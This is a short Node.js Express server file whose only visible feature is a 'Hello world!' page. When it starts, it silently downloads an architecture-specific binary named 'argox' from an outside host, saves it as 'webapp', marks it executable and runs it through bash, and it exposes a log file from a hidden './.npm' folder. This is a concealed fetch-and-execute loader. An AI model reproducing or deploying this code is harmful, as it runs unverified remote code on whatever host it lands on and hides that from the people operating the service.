const express = require("express");
const app = express();
const os = require('os'); 
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');
const FILE_PATH = './.npm';
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;

app.get("/", function(req, res) {
  res.send("Hello world!");
});

app.get("/log", (req, res) => {
  const logPath = path.join(FILE_PATH, 'log.txt');
  fs.readFile(logPath, "utf8", (err, data) => {
    if (err) {
      console.error(err);
      res.status(500).send("Error reading log.txt");
    } else {
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.send(data);
    }
  });
});

const getDownloadUrl = () => {
  const arch = os.arch(); 
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    return 'https://arm64.2go.us.kg/argox';
  } else {
    return 'https://amd64.2go.us.kg/argox';
  }
};

const downloadFile = async () => {
  try {
    const url = getDownloadUrl();
    // console.log(`Start downloading from ${url}...`);
    const response = await axios({
      method: 'get',
      url: url,
      responseType: 'stream'
    });

    const writer = fs.createWriteStream('webapp');
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
        console.log('Download completed');
        exec('chmod +x webapp', (err) => {
          if (err) reject(err);
          resolve();
        });
      });
      writer.on('error', reject);
    });
  } catch (err) {
    throw err;
  }
};

const Execute = async () => {
  try {
    await downloadFile();
    const command = './webapp';
    exec(command, { 
      shell: '/bin/bash'
    });
  } catch (err) {
    console.error('Error executing command:', err);
  }
};

Execute();

app.listen(PORT, () => {
  console.log(`Server is running on port:${PORT}`);
});
